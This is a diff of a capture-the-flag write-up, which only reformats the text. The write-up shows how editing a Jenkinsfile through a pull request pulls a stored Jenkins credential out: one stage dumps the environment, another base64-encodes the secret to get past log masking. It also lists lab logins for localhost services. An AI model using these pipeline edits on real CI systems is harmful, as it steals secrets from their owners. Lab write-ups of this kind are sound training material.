@@ -5,15 +5,15 @@ The challenge : I’m late, I’m late! No time to say ״hello, goodbye״! Befor
 ## Brainstorming
 
 For starter, we were given credentials for :
-Jenkins http://localhost:8080
-Username: alice
-Password: alice
-Gitea http://localhost:3000
-Username: thealice
-Password: thealice
-GitLab http://localhost:4000
-Username: alice
-Password: alice1234
+- **Jenkins** http://localhost:8080
+  - Username: alice
+  - Password: alice
+- **Gitea** http://localhost:3000
+  - Username: thealice
+  - Password: thealice
+- **GitLab** http://localhost:4000
+  - Username: alice
+  - Password: alice1234
 
 And when we look at the challenge, it seems that the flag1 is a secret that was stored in Jenkins. Moreover, the challenge told us to use our access to the repository in gitea to do that so it might be vulnerability related to Jenkinsfile. 
 
@@ -26,14 +26,13 @@ First we try to change the Jenkinsfile and create a new pull request and we see 
 
 To get the credentials through Jenkinsfile, we can add this stage to the Jenkinsfile :
 ```
-        stage ('Looking for credentials'){
-            steps{
-            withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
-    sh '''
-        env
+stage('Looking for credentials') {
+  steps {
+    withCredentials([string(credentialsId : 'flag1', variable : 'SECRET')]) {
+      sh ''' env
     '''                 
-} 
-} 
+    }
+  }
 }
 ```
 
@@ -50,14 +49,13 @@ So we change the Jenkinsfile to this to print out the base 64 of the secret :
 
 stage to the Jenkinsfile :
 ```
-        stage ('Looking for credentials'){
-            steps{
-            withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
-    sh '''
-        echo $SECRET | base64 
+stage('Looking for credentials') {
+  steps {
+    withCredentials([string(credentialsId : 'flag1', variable : 'SECRET')]) {
+      sh ''' echo $SECRET | base64 
     '''                 
-} 
-} 
+    }
+  }
 }
 ```
 
